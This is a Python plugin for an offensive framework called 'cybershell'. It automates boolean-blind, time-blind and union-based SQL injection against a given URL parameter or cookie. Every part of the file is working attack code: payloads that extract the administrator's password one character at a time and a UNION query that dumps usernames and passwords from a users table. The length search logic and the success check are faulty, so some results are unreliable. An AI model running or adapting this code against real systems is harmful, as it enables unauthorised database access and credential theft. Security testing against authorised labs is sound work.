import time
import string
import requests
from typing import Dict, List, Any
from cybershell.plugins import PluginBase

class AdvancedSQLiPlugin(PluginBase):
    def __init__(self):
        super().__init__()
        self.name = "AdvancedSQLiPlugin"
        self.description = "Advanced SQL injection techniques including blind extraction"
        
    def execute(self, context: Dict[str, Any]) -> Dict[str, Any]:
        url = context.get('url', '')
        parameter = context.get('parameter', '')
        injection_type = context.get('injection_type', 'boolean_blind')
        
        if injection_type == 'boolean_blind':
            return self._boolean_blind_sqli(url, parameter)
        elif injection_type == 'time_blind':
            return self._time_blind_sqli(url, parameter)
        elif injection_type == 'union_based':
            return self._union_based_sqli(url, parameter)
            
        return {'success': False, 'error': 'Unknown injection type'}
    
    def _boolean_blind_sqli(self, url: str, parameter: str) -> Dict[str, Any]:
        """Boolean-based blind SQL injection (like XBOW's method)"""
        
        # First, determine password length
        password_length = self._determine_password_length(url, parameter)
        if not password_length:
            return {'success': False, 'error': 'Could not determine password length'}
        
        # Extract password character by character
        password = self._extract_password_blind(url, parameter, password_length)
        
        return {
            'success': bool(password),
            'password': password,
            'password_length': password_length,
            'evidence_score': 0.9 if password else 0.3
        }
    
    def _determine_password_length(self, url: str, parameter: str) -> int:
        """Determine password length using binary search"""
        
        def test_length(length: int) -> bool:
            payload = f"' OR (SELECT '1' FROM users WHERE username='administrator' AND LENGTH(password)={length})='1"
            return self._test_payload(url, parameter, payload)
        
        # Binary search for password length
        low, high = 1, 50
        while low <= high:
            mid = (low + high) // 2
            if test_length(mid):
                return mid
            elif test_length(mid + 1):
                low = mid + 1
            else:
                high = mid - 1
                
        # Linear search as fallback
        for length in range(1, 51):
            if test_length(length):
                return length
                
        return 0
    
    def _extract_password_blind(self, url: str, parameter: str, length: int) -> str:
        """Extract password character by character"""
        password = ""
        charset = string.ascii_lowercase + string.digits
        
        for position in range(1, length + 1):
            for char in charset:
                payload = f"' OR SUBSTRING((SELECT password FROM users WHERE username='administrator'), {position}, 1)='{char}"
                
                if self._test_payload(url, parameter, payload):
                    password += char
                    print(f"Found character {position}: {char} (password so far: {password})")
                    break
            else:
                print(f"Could not find character at position {position}")
                break
                
        return password
    
    def _test_payload(self, url: str, parameter: str, payload: str) -> bool:
        """Test if a payload returns a positive result"""
        try:
            # For cookie-based injection
            if 'cookie' in parameter.lower():
                cookies = {parameter: payload}
                response = requests.get(url, cookies=cookies, timeout=10)
            else:
                # For parameter-based injection
                params = {parameter: payload}
                response = requests.get(url, params=params, timeout=10)
            
            # Look for success indicators
            return "Welcome back" in response.text or response.status_code == 200
            
        except Exception:
            return False
    
    def _time_blind_sqli(self, url: str, parameter: str) -> Dict[str, Any]:
        """Time-based blind SQL injection"""
        
        # Test for time delay
        delay_payload = "'; IF (1=1) WAITFOR DELAY '00:00:05'--"
        
        start_time = time.time()
        self._test_payload(url, parameter, delay_payload)
        elapsed = time.time() - start_time
        
        if elapsed >= 4:  # Allow some margin
            # Extract data using time delays
            data = self._extract_data_time_based(url, parameter)
            return {
                'success': True,
                'technique': 'time_based_blind',
                'data': data,
                'evidence_score': 0.85
            }
        
        return {'success': False, 'error': 'No time delay detected'}
    
    def _extract_data_time_based(self, url: str, parameter: str) -> str:
        """Extract data using time-based technique"""
        data = ""
        charset = string.ascii_lowercase + string.digits + string.ascii_uppercase
        
        for position in range(1, 21):  # Extract up to 20 characters
            for char in charset:
                payload = f"'; IF (ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'), {position}, 1))={ord(char)}) WAITFOR DELAY '00:00:03'--"
                
                start_time = time.time()
                self._test_payload(url, parameter, payload)
                elapsed = time.time() - start_time
                
                if elapsed >= 2:
                    data += char
                    break
            else:
                break
                
        return data
    
    def _union_based_sqli(self, url: str, parameter: str) -> Dict[str, Any]:
        """Union-based SQL injection"""
        
        # Determine number of columns
        columns = self._determine_columns(url, parameter)
        if not columns:
            return {'success': False, 'error': 'Could not determine column count'}
        
        # Extract data using UNION
        union_payload = f"' UNION SELECT {','.join(['NULL'] * (columns-2))},username,password FROM users--"
        
        try:
            if 'cookie' in parameter.lower():
                cookies = {parameter: union_payload}
                response = requests.get(url, cookies=cookies, timeout=10)
            else:
                params = {parameter: union_payload}
                response = requests.get(url, params=params, timeout=10)
            
            return {
                'success': True,
                'technique': 'union_based',
                'response': response.text,
                'columns': columns,
                'evidence_score': 0.95
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _determine_columns(self, url: str, parameter: str) -> int:
        """Determine number of columns for UNION injection"""
        for i in range(1, 20):
            payload = f"' UNION SELECT {','.join(['NULL'] * i)}--"
            
            try:
                if 'cookie' in parameter.lower():
                    cookies = {parameter: payload}
                    response = requests.get(url, cookies=cookies, timeout=10)
                else:
                    params = {parameter: payload}
                    response = requests.get(url, params=params, timeout=10)
                
                if response.status_code == 200 and "error" not in response.text.lower():
                    return i
                    
            except Exception:
                continue
                
        return 0
